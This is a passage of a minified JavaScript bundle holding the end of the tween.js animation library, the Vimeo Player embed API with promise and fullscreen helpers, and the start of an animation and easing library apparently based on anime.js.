a=t[i]||0,o=n[i],s=Array.isArray(e[i]),l=Array.isArray(o);!s&&l?e[i]=this._interpolationFunction(o,r):"object"===_typeof2(o)&&o?this._updateProperties(e[i],a,o,r):"number"==typeof(o=this._handleRelativeValue(a,o))&&(e[i]=a+(o-a)*r)}},e.prototype._handleRelativeValue=function(e,t){return"string"!=typeof t?t:"+"===t.charAt(0)||"-"===t.charAt(0)?e+parseFloat(t):parseFloat(t)},e.prototype._swapEndStartRepeatValues=function(e){var t=this._valuesStartRepeat[e],n=this._valuesEnd[e];this._valuesStartRepeat[e]="string"==typeof n?this._valuesStartRepeat[e]+parseFloat(n):this._valuesEnd[e],this._valuesEnd[e]=t},e}(),u=s.nextId,d=l,p=d.getAll.bind(d),h=d.removeAll.bind(d),f=d.add.bind(d),A=d.remove.bind(d),m=d.update.bind(d),v={Easing:r,Group:a,Interpolation:o,now:i,Sequence:s,nextId:u,Tween:c,VERSION:"18.6.4",getAll:p,removeAll:h,add:f,remove:A,update:m};n.Easing=r,n.Group=a,n.Interpolation=o,n.Sequence=s,n.Tween=c,n.VERSION="18.6.4",n.add=f,n.default=v,n.getAll=p,n.nextId=u,n.now=i,n.remove=A,n.removeAll=h,n.update=m}).call(this)}).call(this,e("_process"))},{_process:229}],3:[function(e,t,n){(function(e,r){(function(){var i,a;i=this,a=function(){function t(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}var n=void 0!==e&&"[object global]"==={}.toString.call(e);function i(e,t){return 0===e.indexOf(t.toLowerCase())?e:"".concat(t.toLowerCase()).concat(e.substr(0,1).toUpperCase()).concat(e.substr(1))}function a(e){return/^(https?:)?\/\/((player|www)\.)?vimeo\.com(?=$|\/)/.test(e)}function o(){var e,t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:{},n=t.id,r=t.url,i=n||r;if(!i)throw new Error("An id or url must be passed, either in an options object or as a data-vimeo-id or data-vimeo-url attribute.");if(e=i,!isNaN(parseFloat(e))&&isFinite(e)&&Math.floor(e)==e)return"https://vimeo.com/".concat(i);if(a(i))return i.replace("http:","https:");if(n)throw new TypeError("“".concat(n,"” is not a valid video id."));throw new TypeError("“".concat(i,"” is not a vimeo.com url."))}var s=void 0!==Array.prototype.indexOf,l="undefined"!=typeof window&&void 0!==window.postMessage;if(!(n||s&&l))throw new Error("Sorry, the Vimeo Player API is not available in this browser.");var c="undefined"!=typeof globalThis?globalThis:"undefined"!=typeof window?window:void 0!==e?e:"undefined"!=typeof self?self:{};!function(e){if(!e.WeakMap){var t=Object.prototype.hasOwnProperty,n=function(e,t,n){Object.defineProperty?Object.defineProperty(e,t,{configurable:!0,writable:!0,value:n}):e[t]=n};e.WeakMap=function(){function e(){if(void 0===this)throw new TypeError("Constructor WeakMap requires 'new'");if(n(this,"_id","_WeakMap_"+a()+"."+a()),0<arguments.length)throw new TypeError("WeakMap iterable is not supported")}function i(e,n){if(!r(e)||!t.call(e,"_id"))throw new TypeError(n+" method called on incompatible receiver "+_typeof2(e))}function a(){return Math.random().toString().substring(2)}return n(e.prototype,"delete",(function(e){if(i(this,"delete"),!r(e))return!1;var t=e[this._id];return!(!t||t[0]!==e||(delete e[this._id],0))})),n(e.prototype,"get",(function(e){if(i(this,"get"),r(e)){var t=e[this._id];return t&&t[0]===e?t[1]:void 0}})),n(e.prototype,"has",(function(e){if(i(this,"has"),!r(e))return!1;var t=e[this._id];return!(!t||t[0]!==e)})),n(e.prototype,"set",(function(e,t){if(i(this,"set"),!r(e))throw new TypeError("Invalid value used as weak map key");var a=e[this._id];return a&&a[0]===e?a[1]=t:n(e,this._id,[e,t]),this})),n(e,"_polyfill",!0),e}()}function r(e){return Object(e)===e}}("undefined"!=typeof self?self:"undefined"!=typeof window?window:c);var u,d=(function(e){var t,n,i;i=function(){var e,t,n,i=Object.prototype.toString,a=void 0!==r?function(e){return r(e)}:setTimeout;try{Object.defineProperty({},"x",{}),e=function(e,t,n,r){return Object.defineProperty(e,t,{value:n,writable:!0,configurable:!1!==r})}}catch(i){e=function(e,t,n){return e[t]=n,e}}function o(e,r){n.add(e,r),t||(t=a(n.drain))}function s(e){var t,n=_typeof2(e);return null==e||"object"!=n&&"function"!=n||(t=e.then),"function"==typeof t&&t}function l(){for(var e=0;e<this.chain.length;e++)c(this,1===this.state?this.chain[e].success:this.chain[e].failure,this.chain[e]);this.chain.length=0}function c(e,t,n){var r,i;try{!1===t?n.reject(e.msg):(r=!0===t?e.msg:t.call(void 0,e.msg))===n.promise?n.reject(TypeError("Promise-chain cycle")):(i=s(r))?i.call(r,n.resolve,n.reject):n.resolve(r)}catch(e){n.reject(e)}}function u(e){var t=this;t.triggered||(t.triggered=!0,t.def&&(t=t.def),t.msg=e,t.state=2,0<t.chain.length&&o(l,t))}function d(e,t,n,r){for(var i=0;i<t.length;i++)!function(i){e.resolve(t[i]).then((function(e){n(i,e)}),r)}(i)}function p(e){this.def=e,this.triggered=!1}function h(e){this.promise=e,this.state=0,this.triggered=!1,this.chain=[],this.msg=void 0}function f(e){if("function"!=typeof e)throw TypeError("Not a function");if(0!==this.__NPO__)throw TypeError("Not a promise");this.__NPO__=1;var t=new h(this);this.then=function(e,n){var r={success:"function"!=typeof e||e,failure:"function"==typeof n&&n};return r.promise=new this.constructor((function(e,t){if("function"!=typeof e||"function"!=typeof t)throw TypeError("Not a function");r.resolve=e,r.reject=t})),t.chain.push(r),0!==t.state&&o(l,t),r.promise},this.catch=function(e){return this.then(void 0,e)};try{e.call(void 0,(function(e){(function e(t){var n,r=this;if(!r.triggered){r.triggered=!0,r.def&&(r=r.def);try{(n=s(t))?o((function(){var i=new p(r);try{n.call(t,(function(){e.apply(i,arguments)}),(function(){u.apply(i,arguments)}))}catch(e){u.call(i,e)}})):(r.msg=t,r.state=1,0<r.chain.length&&o(l,r))}catch(e){u.call(new p(r),e)}}}).call(t,e)}),(function(e){u.call(t,e)}))}catch(e){u.call(t,e)}}n=function(){var e,n,r;function i(e,t){this.fn=e,this.self=t,this.next=void 0}return{add:function(t,a){r=new i(t,a),n?n.next=r:e=r,n=r,r=void 0},drain:function(){var r=e;for(e=n=t=void 0;r;)r.fn.call(r.self),r=r.next}}}();var A=e({},"constructor",f,!1);return e(f.prototype=A,"__NPO__",0,!1),e(f,"resolve",(function(e){return e&&"object"==_typeof2(e)&&1===e.__NPO__?e:new this((function(t,n){if("function"!=typeof t||"function"!=typeof n)throw TypeError("Not a function");t(e)}))})),e(f,"reject",(function(e){return new this((function(t,n){if("function"!=typeof t||"function"!=typeof n)throw TypeError("Not a function");n(e)}))})),e(f,"all",(function(e){var t=this;return"[object Array]"!=i.call(e)?t.reject(TypeError("Not an array")):0===e.length?t.resolve([]):new t((function(n,r){if("function"!=typeof n||"function"!=typeof r)throw TypeError("Not a function");var i=e.length,a=Array(i),o=0;d(t,e,(function(e,t){a[e]=t,++o===i&&n(a)}),r)}))})),e(f,"race",(function(e){var t=this;return"[object Array]"!=i.call(e)?t.reject(TypeError("Not an array")):new t((function(n,r){if("function"!=typeof n||"function"!=typeof r)throw TypeError("Not a function");d(t,e,(function(e,t){n(t)}),r)}))})),f},(n=c)[t="Promise"]=n[t]||i(),e.exports&&(e.exports=n[t])}(u={exports:{}}),u.exports),p=new WeakMap;function h(e,t,n){var r=p.get(e.element)||{};t in r||(r[t]=[]),r[t].push(n),p.set(e.element,r)}function f(e,t){return(p.get(e.element)||{})[t]||[]}function A(e,t,n){var r=p.get(e.element)||{};if(!r[t])return!0;if(!n)return r[t]=[],p.set(e.element,r),!0;var i=r[t].indexOf(n);return-1!==i&&r[t].splice(i,1),p.set(e.element,r),r[t]&&0===r[t].length}var m=["autopause","autoplay","background","byline","color","controls","dnt","height","id","loop","maxheight","maxwidth","muted","playsinline","portrait","responsive","speed","texttrack","title","transparent","url","width"];function v(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{};return m.reduce((function(t,n){var r=e.getAttribute("data-vimeo-".concat(n));return(r||""===r)&&(t[n]=""===r?1:r),t}),t)}function g(e,t){var n=e.html;if(!t)throw new TypeError("An element must be provided");if(null!==t.getAttribute("data-vimeo-initialized"))return t.querySelector("iframe");var r=document.createElement("div");return r.innerHTML=n,t.appendChild(r.firstChild),t.setAttribute("data-vimeo-initialized","true"),t.querySelector("iframe")}function y(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{},n=2<arguments.length?arguments[2]:void 0;return new Promise((function(r,i){if(!a(e))throw new TypeError("“".concat(e,"” is not a vimeo.com url."));var o="https://vimeo.com/api/oembed.json?url=".concat(encodeURIComponent(e));for(var s in t)t.hasOwnProperty(s)&&(o+="&".concat(s,"=").concat(encodeURIComponent(t[s])));var l="XDomainRequest"in window?new XDomainRequest:new XMLHttpRequest;l.open("GET",o,!0),l.onload=function(){if(404!==l.status)if(403!==l.status)try{var t=JSON.parse(l.responseText);if(403===t.domain_status_code)return g(t,n),void i(new Error("“".concat(e,"” is not embeddable.")));r(t)}catch(t){i(t)}else i(new Error("“".concat(e,"” is not embeddable.")));else i(new Error("“".concat(e,"” was not found.")))},l.onerror=function(){var e=l.status?" (".concat(l.status,")"):"";i(new Error("There was an error fetching the embed code from Vimeo".concat(e,".")))},l.send()}))}function b(e){if("string"==typeof e)try{e=JSON.parse(e)}catch(e){return{}}return e}function _(e,t,n){if(e.element.contentWindow&&e.element.contentWindow.postMessage){var r={method:t};void 0!==n&&(r.value=n);var i=parseFloat(navigator.userAgent.toLowerCase().replace(/^.*msie (\d+).*$/,"$1"));8<=i&&i<10&&(r=JSON.stringify(r)),e.element.contentWindow.postMessage(r,e.origin)}}function w(e,t){var n,r=[];if((t=b(t)).event)"error"===t.event&&f(e,t.data.method).forEach((function(n){var r=new Error(t.data.message);r.name=t.data.name,n.reject(r),A(e,t.data.method,n)})),r=f(e,"event:".concat(t.event)),n=t.data;else if(t.method){var i=function(e,t){var n=f(e,t);if(n.length<1)return!1;var r=n.shift();return A(e,t,r),r}(e,t.method);i&&(r.push(i),n=t.value)}r.forEach((function(t){try{if("function"==typeof t)return void t.call(e,n);t.resolve(n)}catch(t){}}))}var C,x,S,k=new WeakMap,M=new WeakMap,B={},E=function(){function e(t){var n,r=this,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{};if(function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),window.jQuery&&t instanceof jQuery&&(1<t.length&&window.console&&console.warn,t=t[0]),"undefined"!=typeof document&&"string"==typeof t&&(t=document.getElementById(t)),n=t,!Boolean(n&&1===n.nodeType&&"nodeName"in n&&n.ownerDocument&&n.ownerDocument.defaultView))throw new TypeError("You must pass either a valid element or a valid id.");if("IFRAME"!==t.nodeName){var s=t.querySelector("iframe");s&&(t=s)}if("IFRAME"===t.nodeName&&!a(t.getAttribute("src")||""))throw new Error("The player element passed isn’t a Vimeo embed.");if(k.has(t))return k.get(t);this._window=t.ownerDocument.defaultView,this.element=t,this.origin="*";var l=new d((function(e,n){if(r._onMessage=function(t){if(a(t.origin)&&r.element.contentWindow===t.source){"*"===r.origin&&(r.origin=t.origin);var i=b(t.data);if(i&&"error"===i.event&&i.data&&"ready"===i.data.method){var o=new Error(i.data.message);return o.name=i.data.name,void n(o)}var s=i&&"ready"===i.event,l=i&&"ping"===i.method;if(s||l)return r.element.setAttribute("data-ready","true"),void e();w(r,i)}},r._window.addEventListener("message",r._onMessage),"IFRAME"!==r.element.nodeName){var s=v(t,i);y(o(s),s,t).then((function(e){var n,i,a,o=g(e,t);return r.element=o,r._originalElement=t,n=t,i=o,a=p.get(n),p.set(i,a),p.delete(n),k.set(r.element,r),e})).catch(n)}}));if(M.set(this,l),k.set(this.element,this),"IFRAME"===this.element.nodeName&&_(this,"ping"),B.isEnabled){var c=function(){return B.exit()};B.on("fullscreenchange",(function(){B.isFullscreen?h(r,"event:exitFullscreen",c):A(r,"event:exitFullscreen",c),r.ready().then((function(){_(r,"fullscreenchange",B.isFullscreen)}))}))}return this}var n,r;return n=e,(r=[{key:"callMethod",value:function(e){var t=this,n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{};return new d((function(r,i){return t.ready().then((function(){h(t,e,{resolve:r,reject:i}),_(t,e,n)})).catch(i)}))}},{key:"get",value:function(e){var t=this;return new d((function(n,r){return e=i(e,"get"),t.ready().then((function(){h(t,e,{resolve:n,reject:r}),_(t,e)})).catch(r)}))}},{key:"set",value:function(e,t){var n=this;return new d((function(r,a){if(e=i(e,"set"),null==t)throw new TypeError("There must be a value to set.");return n.ready().then((function(){h(n,e,{resolve:r,reject:a}),_(n,e,t)})).catch(a)}))}},{key:"on",value:function(e,t){if(!e)throw new TypeError("You must pass an event name.");if(!t)throw new TypeError("You must pass a callback function.");if("function"!=typeof t)throw new TypeError("The callback must be a function.");0===f(this,"event:".concat(e)).length&&this.callMethod("addEventListener",e).catch((function(){})),h(this,"event:".concat(e),t)}},{key:"off",value:function(e,t){if(!e)throw new TypeError("You must pass an event name.");if(t&&"function"!=typeof t)throw new TypeError("The callback must be a function.");A(this,"event:".concat(e),t)&&this.callMethod("removeEventListener",e).catch((function(e){}))}},{key:"loadVideo",value:function(e){return this.callMethod("loadVideo",e)}},{key:"ready",value:function(){var e=M.get(this)||new d((function(e,t){t(new Error("Unknown player. Probably unloaded."))}));return d.resolve(e)}},{key:"addCuePoint",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{};return this.callMethod("addCuePoint",{time:e,data:t})}},{key:"removeCuePoint",value:function(e){return this.callMethod("removeCuePoint",e)}},{key:"enableTextTrack",value:function(e,t){if(!e)throw new TypeError("You must pass a language.");return this.callMethod("enableTextTrack",{language:e,kind:t})}},{key:"disableTextTrack",value:function(){return this.callMethod("disableTextTrack")}},{key:"pause",value:function(){return this.callMethod("pause")}},{key:"play",value:function(){return this.callMethod("play")}},{key:"requestFullscreen",value:function(){return B.isEnabled?B.request(this.element):this.callMethod("requestFullscreen")}},{key:"exitFullscreen",value:function(){return B.isEnabled?B.exit():this.callMethod("exitFullscreen")}},{key:"getFullscreen",value:function(){return B.isEnabled?d.resolve(B.isFullscreen):this.get("fullscreen")}},{key:"unload",value:function(){return this.callMethod("unload")}},{key:"destroy",value:function(){var e=this;return new d((function(t){if(M.delete(e),k.delete(e.element),e._originalElement&&(k.delete(e._originalElement),e._originalElement.removeAttribute("data-vimeo-initialized")),e.element&&"IFRAME"===e.element.nodeName&&e.element.parentNode&&e.element.parentNode.removeChild(e.element),e.element&&"DIV"===e.element.nodeName&&e.element.parentNode){e.element.removeAttribute("data-vimeo-initialized");var n=e.element.querySelector("iframe");n&&n.parentNode&&n.parentNode.removeChild(n)}e._window.removeEventListener("message",e._onMessage),t()}))}},{key:"getAutopause",value:function(){return this.get("autopause")}},{key:"setAutopause",value:function(e){return this.set("autopause",e)}},{key:"getBuffered",value:function(){return this.get("buffered")}},{key:"getCameraProps",value:function(){return this.get("cameraProps")}},{key:"setCameraProps",value:function(e){return this.set("cameraProps",e)}},{key:"getChapters",value:function(){return this.get("chapters")}},{key:"getCurrentChapter",value:function(){return this.get("currentChapter")}},{key:"getColor",value:function(){return this.get("color")}},{key:"setColor",value:function(e){return this.set("color",e)}},{key:"getCuePoints",value:function(){return this.get("cuePoints")}},{key:"getCurrentTime",value:function(){return this.get("currentTime")}},{key:"setCurrentTime",value:function(e){return this.set("currentTime",e)}},{key:"getDuration",value:function(){return this.get("duration")}},{key:"getEnded",value:function(){return this.get("ended")}},{key:"getLoop",value:function(){return this.get("loop")}},{key:"setLoop",value:function(e){return this.set("loop",e)}},{key:"setMuted",value:function(e){return this.set("muted",e)}},{key:"getMuted",value:function(){return this.get("muted")}},{key:"getPaused",value:function(){return this.get("paused")}},{key:"getPlaybackRate",value:function(){return this.get("playbackRate")}},{key:"setPlaybackRate",value:function(e){return this.set("playbackRate",e)}},{key:"getPlayed",value:function(){return this.get("played")}},{key:"getQualities",value:function(){return this.get("qualities")}},{key:"getQuality",value:function(){return this.get("quality")}},{key:"setQuality",value:function(e){return this.set("quality",e)}},{key:"getSeekable",value:function(){return this.get("seekable")}},{key:"getSeeking",value:function(){return this.get("seeking")}},{key:"getTextTracks",value:function(){return this.get("textTracks")}},{key:"getVideoEmbedCode",value:function(){return this.get("videoEmbedCode")}},{key:"getVideoId",value:function(){return this.get("videoId")}},{key:"getVideoTitle",value:function(){return this.get("videoTitle")}},{key:"getVideoWidth",value:function(){return this.get("videoWidth")}},{key:"getVideoHeight",value:function(){return this.get("videoHeight")}},{key:"getVideoUrl",value:function(){return this.get("videoUrl")}},{key:"getVolume",value:function(){return this.get("volume")}},{key:"setVolume",value:function(e){return this.set("volume",e)}}])&&t(n.prototype,r),e}();return n||(C=function(){for(var e,t=[["requestFullscreen","exitFullscreen","fullscreenElement","fullscreenEnabled","fullscreenchange","fullscreenerror"],["webkitRequestFullscreen","webkitExitFullscreen","webkitFullscreenElement","webkitFullscreenEnabled","webkitfullscreenchange","webkitfullscreenerror"],["webkitRequestFullScreen","webkitCancelFullScreen","webkitCurrentFullScreenElement","webkitCancelFullScreen","webkitfullscreenchange","webkitfullscreenerror"],["mozRequestFullScreen","mozCancelFullScreen","mozFullScreenElement","mozFullScreenEnabled","mozfullscreenchange","mozfullscreenerror"],["msRequestFullscreen","msExitFullscreen","msFullscreenElement","msFullscreenEnabled","MSFullscreenChange","MSFullscreenError"]],n=0,r=t.length,i={};n<r;n++)if((e=t[n])&&e[1]in document){for(n=0;n<e.length;n++)i[t[0][n]]=e[n];return i}return!1}(),x={fullscreenchange:C.fullscreenchange,fullscreenerror:C.fullscreenerror},S={request:function(e){return new Promise((function(t,n){var r=function e(){S.off("fullscreenchange",e),t()};S.on("fullscreenchange",r);var i=(e=e||document.documentElement)[C.requestFullscreen]();i instanceof Promise&&i.then(r).catch(n)}))},exit:function(){return new Promise((function(e,t){if(S.isFullscreen){var n=function t(){S.off("fullscreenchange",t),e()};S.on("fullscreenchange",n);var r=document[C.exitFullscreen]();r instanceof Promise&&r.then(n).catch(t)}else e()}))},on:function(e,t){var n=x[e];n&&document.addEventListener(n,t)},off:function(e,t){var n=x[e];n&&document.removeEventListener(n,t)}},Object.defineProperties(S,{isFullscreen:{get:function(){return Boolean(document[C.fullscreenElement])}},element:{enumerable:!0,get:function(){return document[C.fullscreenElement]}},isEnabled:{enumerable:!0,get:function(){return Boolean(document[C.fullscreenEnabled])}}}),B=S,function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:document,t=[].slice.call(e.querySelectorAll("[data-vimeo-id], [data-vimeo-url]")),n=function(e){"console"in window&&console.error};t.forEach((function(e){try{if(null!==e.getAttribute("data-vimeo-defer"))return;var t=v(e);y(o(t),t,e).then((function(t){return g(t,e)})).catch(n)}catch(t){n()}}))}(),function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:document;window.VimeoPlayerResizeEmbeds_||(window.VimeoPlayerResizeEmbeds_=!0,window.addEventListener("message",(function(t){if(a(t.origin)&&t.data&&"spacechange"===t.data.event)for(var n=e.querySelectorAll("iframe"),r=0;r<n.length;r++)if(n[r].contentWindow===t.source){n[r].parentElement.style.paddingBottom="".concat(t.data.data[0].bottom,"px");break}})))}()),E},"object"===_typeof2(n)&&void 0!==t?t.exports=a():"function"==typeof define&&define.amd?define(a):((i="undefined"!=typeof globalThis?globalThis:i||self).Vimeo=i.Vimeo||{},i.Vimeo.Player=a())}).call(this)}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{},e("timers").setImmediate)},{timers:274}],4:[function(e,t,n){var r={update:null,begin:null,loopBegin:null,changeBegin:null,change:null,changeComplete:null,loopComplete:null,complete:null,loop:1,direction:"normal",autoplay:!0,timelineOffset:0},i={duration:1e3,delay:0,endDelay:0,easing:"easeOutElastic(1, .5)",round:0},a=["translateX","translateY","translateZ","rotate","rotateX","rotateY","rotateZ","scale","scaleX","scaleY","scaleZ","skew","skewX","skewY","perspective","matrix","matrix3d"],o={CSS:{},springs:{}};function s(e,t,n){return Math.min(Math.max(e,t),n)}function l(e,t){return-1<e.indexOf(t)}function c(e,t){return e.apply(null,t)}var u={arr:function(e){return Array.isArray(e)},obj:function(e){return l(Object.prototype.toString.call(e),"Object")},pth:function(e){return u.obj(e)&&e.hasOwnProperty("totalLength")},svg:function(e){return e instanceof SVGElement},inp:function(e){return e instanceof HTMLInputElement},dom:function(e){return e.nodeType||u.svg(e)},str:function(e){return"string"==typeof e},fnc:function(e){return"function"==typeof e},und:function(e){return void 0===e},nil:function(e){return u.und(e)||null===e},hex:function(e){return/(^#[0-9A-F]{6}$)|(^#[0-9A-F]{3}$)/i.test(e)},rgb:function(e){return/^rgb/.test(e)},hsl:function(e){return/^hsl/.test(e)},col:function(e){return u.hex(e)||u.rgb(e)||u.hsl(e)},key:function(e){return!r.hasOwnProperty(e)&&!i.hasOwnProperty(e)&&"targets"!==e&&"keyframes"!==e}};function d(e){var t=/\(([^)]+)\)/.exec(e);return t?t[1].split(",").map((function(e){return parseFloat(e)})):[]}function p(e,t){var n=d(e),r=s(u.und(n[0])?1:n[0],.1,100),i=s(u.und(n[1])?100:n[1],.1,100),a=s(u.und(n[2])?10:n[2],.1,100),l=s(u.und(n[3])?0:n[3],.1,100),c=Math.sqrt(i/r),p=a/(2*Math.sqrt(i*r)),h=p<1?c*Math.sqrt(1-p*p):0,f=p<1?(p*c-l)/h:-l+c;function A(e){var n=t?t*e/1e3:e;return n=p<1?Math.exp(-n*p*c)*(1*Math.cos(h*n)+f*Math.sin(h*n)):(1+f*n)*Math.exp(-n*c),0===e||1===e?e:1-n}return t?A:function(){var t=o.springs[e];if(t)return t;for(var n=0,r=0;;)if(1===A(n+=1/6)){if(16<=++r)break}else r=0;var i=n*(1/6)*1e3;return o.springs[e]=i}}function h(e){return void 0===e&&(e=10),function(t){return Math.ceil(s(t,1e-6,1)*e)*(1/e)}}var f,A,m=function(){function e(e,t){return 1-3*t+3*e}function t(e,t){return 3*t-6*e}function n(e){return 3*e}function r(r,i,a){return((e(i,a)*r+t(i,a))*r+n(i))*r}function i(r,i,a){return 3*e(i,a)*r*r+2*t(i,a)*r+n(i)}return function(e,t,n,a){if(0<=e&&e<=1&&0<=n&&n<=1){var o=new Float32Array(11);if(e!==t||n!==a)for(var s=0;s<11;++s)o[s]=r(.1*s,e,n);return function(s){return e===t&&n===a||0===s||1===s?s:r(function(t){for(var a=0,s=1;10!==s&&o[s]<=t;++s)a+=.1;var l=a+(t-o[--s])/(o[s+1]-o[s])*.1,c=i(l,e,n);return.001<=c?function(e,t,n,a){for(var o=0;o<4;++o){var s=i(t,n,a);if(0===s)return t;t-=(r(t,n,a)-e)/s}return t}(t,l,e,n):0===c?l:function(e,t,n,i,a){for(var o,s,l=0;0<(o=r(s=t+(n-t)/2,i,a)-e)?n=s:t=s,1e-7<Math.abs(o)&&++l<10;);return s}(t,a,a+.1,e,n)}(s),t,a)}}}}(),v=(f={linear:function(){return function(e){return e}}},A={Sine:function(){return function(e){return 1-Math.cos(e*Math.PI/2)}},Circ:function(){return function(e){return 1-Math.sqrt(1-e*e)}},Back:function(){return function(e){return e*e*(3*e-2)}},Bounce:function(){return function(e){for(var t,n=4;e<((t=Math.pow(2,--n))-1)/11;);return 1/Math.pow(4,3-n)-7.5625*Math.pow((3*t-2)/22-e,2)}},Elastic:function(e,t){void 0===e&&(e=1),void 0===t&&(t=.5);var n=s(e,1,10),r=s(t,.1,2);return function(e){return 0===e||1===e?e:-n*Math.pow(2,10*(e-1))*Math.sin((e-1-r/(2*Math.PI)*Math.asin(1/n))*(2*Math.PI)/r)}}},["Quad","Cubic","Quart","Quint","Expo"].forEach((function(e,t){A[e]=function(){return function(e){return Math.pow(e,t+2)}}})),Object.keys(A).forEach((function(e){var t=A[e];f["easeIn"+e]=t,f["easeOut"+e]=function(e,n){return function(r){return 1-t(e,n)(1-r)}},f["easeInOut"+e]=function(e,n){return function(r){return r<.5?t(e,n)(2*r)/2:1-t(e,n)(-2*r+2)/2}},f["easeOutIn"+e]=function(e,n){return function(r){return r<.5?(1-t(e,n)(1-2*r))/2:(t(e,n)(2*r-1)+1)/2}}})),f);function g(e,t){if(u.fnc(e))return e;var n=e.split("(")[0],r=v[n],i=d(e);switch(n){case"spring":return p(e,t);case"cubicBezier":return c(m,i);case"steps":return c(h,i);default:return c(r,i)}}function y(e){try{return document.querySelectorAll(e)}catch(e){return}}function b(e,t){for(var n=e.length,r=2<=arguments.length?t:void 0,i=[],a=0;a<n;a++)if(a in e){var o=e[a];t.call(r,o,a,e)&&i.push(o)}return i}function _(e){return e.reduce((function(e,t){return e.concat(u.arr(t)?_(t):t)}),[])}function w(e){return u.arr(e)?e:(u.str(e)&&(e=y(e)||e),e instanceof NodeList||e instanceof HTMLCollection?[].slice.call(e):[e])}function C(e,t){return e.some((function(e){return e===t}))}function x(e){var t={};for(var n in e)t[n]=e[n];return t}function S(e,t){var n=x(e);for(var r in e)n[r]=t.hasOwnProperty(r)?t[r]:e[r];return n}function k(e,t){var n=x(e);for(var r in t)n[r]=u.und(e[r])?t[r]:e[r];return n}function M(e){var t=/[+-]?\d*\.?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?(%|px|pt|em|rem|in|cm|mm|ex|ch|pc|vw|vh|vmin|vmax|deg|rad|turn)?$/.exec(e);if(t)return t[1]}function B(e,t){return u.fnc(e)?e(t.target,t.id,t.total):e}function E(e,t){return e.getAttribute(t)}function T(e,t,n){if(C([n,"deg","rad","turn"],M(t)))return t;var r=o.CSS[t+n];if(!u.und(r))return r;var i=document.createElement(e.tagName),a=e.parentNode&&e.parentNode!==document?e.parentNode:document.body;a.appendChild(i),i.style.position="absolute",i.style.width=100+n;var s=100/i.offsetWidth;a.removeChild(i);var l=s*parseFloat(t);return o.CSS[t+n]=l}function P(e,t,n){if(t in e.style){var r=t.replace(/([a-z])([A-Z])/g,"$1-$2").toLowerCase(),i=e.style[t]||getComputedStyle(e).getPropertyValue(r)||"0";return n?T(e,i,n):i}}function I(e,t){return u.dom(e)&&!u.inp(e)&&(!u.nil(E(e,t))||u.svg(e)&&e[t])?"attribute":u.dom(e)&&C(a,t)?"transform":u.dom(e)&&"transform"!==t&&P(e,t)?"css":null!=e[t]?"object":void 0}function F(e){if(u.dom(e)){for(var t,n=e.style.transform||"",r=/(\w+)\(([^)]*)\)/g,i=new Map;t=r.exec(n);)i.set(t[1],t[2]);return i}}function L(e,t,n,r){switch(I(e,t)){case"transform":return function(e,t,n,r){var i,a=l(t,"scale")?1:0+(l(i=t,"translate")||"perspective"===i?"px":l(i,"rotate")||l(i,"skew")?"deg":void 0),o=F(e).get(t)||a;return n&&(n.transforms.list.set(t,o),n.transforms.last=t),r?T(e,o,r):o}(e,t,r,n);case"css":return P(e,t,n);case"attribute":return E(e,t);default:return e[t]||0}}function O(e,t){var n=/^(\*=|\+=|-=)/.exec(e);if(!n)return e;var r=M(e)||0,i=parseFloat(t),a=parseFloat(e.replace(n[0],""));switch(n[0][0]){case"+":return i+a+r;case"-":return i-a+r;case"*":return i*a+r}}function N(e,t){if(u.col(e))return function(e){return u.rgb(e)?(n=/rgb\((\d+,\s*[\d]+,\s*[\d]+)\)/g.exec(t=e))?"rgba("+n[1]+",1)":t:u.hex(e)?(r=e.replace(/^#?([a-f\d])([a-f\d])([a-f\d])$/i,(function(e,t,n,r){return t+t+n+n+r+r})),i=/^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(r),"rgba("+parseInt(i[1],16)+","+parseInt(i[2],16)+","+parseInt(i[3],16)+",1)"):u.hsl(e)?function(e){var t,n,r,i=/hsl\((\d+),\s*([\d.]+)%,\s*([\d.]+)%\)/g.exec(e)||/hsla\((\d+),\s*([\d.]+)%,\s*([\d.]+)%,\s*([\d.]+)\)/g.exec(e),a=parseInt(i[1],10)/360,o=parseInt(i[2],10)/100,s=parseInt(i[3],10)/100,l=i[4]||1;function c(e,t,n){return n<0&&(n+=1),1<n&&(n-=1),n<1/6?e+6*(t-e)*n:n<.5?t:n<2/3?e+(t-e)*(2/3-n)*6:e}if(0==o)t=n=r=s;else{var u=s<.5?s*(1+o):s+o-s*o,d=2*s-u;t=c(d,u,a+1/3),n=c(d,u,a),r=c(d,u,a-1/3)}return"rgba("+255*t+","+255*n+","+255*r+","+l+")"}(e):void 0;var t,n,r,i}(e);if(/\s/g.test(e))return e;var n=M(e),r=n?e.substr(0,e.length-n.length):e;return t?r+t:r}function D(e,t){return Math.sqrt(Math.pow(t.x-e.x,2)+Math.pow(t.y-e.y,2))}function R(e){for(var t,n=e.points,r=0,i=0;i<n.numberOfItems;i++){var a=n.getItem(i);0<i&&(r+=D(t,a)),t=a}return r}function j(e){if(e.getTotalLength)return e.getTotalLength();switch(e.tagName.toLowerCase()){case"circle":return a=e,2*Math.PI*E(a,"r");case"rect":return 2*E(i=e,"width")+2*E(i,"height");case"line":return D({x:E(r=e,"x1"),y:E(r,"y1")},{x:E(r,"x2"),y:E(r,"y2")});case"polyline":return R(e);case"polygon":return n=(t=e).points,R(t)+D(n.getItem(n.numberOfItems-1),n.getItem(0))}var t,n,r,i,a}function U(e,t){var n=t||{},r=n.el||function(e){for(var t=e.parentNode;u.svg(t)&&u.svg(t.parentNode);)t=t.parentNode;return t}(e),i=r.getBoundingClientRect(),a=E(r,"viewBox"),o=i.width,s=i.height,l=n.viewBox||(a?a.split(" "):[0,0,o,s]);return{el:r,viewBox:l,x:l[0]/1,y:l[1]/1,w:o,h:s,vW:l[2],vH:l[3]}}function $(e,t,n){function r(n){void 0===n&&(n=0);var 